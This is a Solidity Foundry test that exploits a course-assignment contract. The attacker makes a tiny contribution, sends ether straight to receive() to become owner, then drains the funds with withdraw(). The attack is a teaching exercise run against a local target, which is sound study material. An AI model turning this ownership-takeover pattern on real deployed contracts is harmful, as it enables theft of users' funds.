// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Foundry standard test utilities
import "forge-std/Test.sol";

// Import the vulnerable contract
import "../src/Assignment11.sol";

contract Assignment11ExploitTest is Test {
    Assignment11 public target;
    address public attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        target = new Assignment11();

        // Fund the contract with ether to simulate real funds
        vm.deal(address(target), 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        // Step 1: Contribute < 0.001 ether to pass the check
        target.contribute{value: 0.0005 ether}();

        // Step 2: Send ether directly to trigger `receive()` and become owner
        (bool success, ) = address(target).call{value: 0.0001 ether}("");
        require(success, "Fallback call failed");

        // Step 3: Check that ownership has been transferred
        assertEq(target.owner(), attacker, "Ownership not transferred");

        // Step 4: Drain the contract
        uint256 before = attacker.balance;
        target.withdraw();
        uint256 afterBalance = attacker.balance;

        assertGt(afterBalance, before, "Funds were not drained");

        vm.stopPrank();
    }

    // Allow contract to receive ether if needed
    receive() external payable {}
}
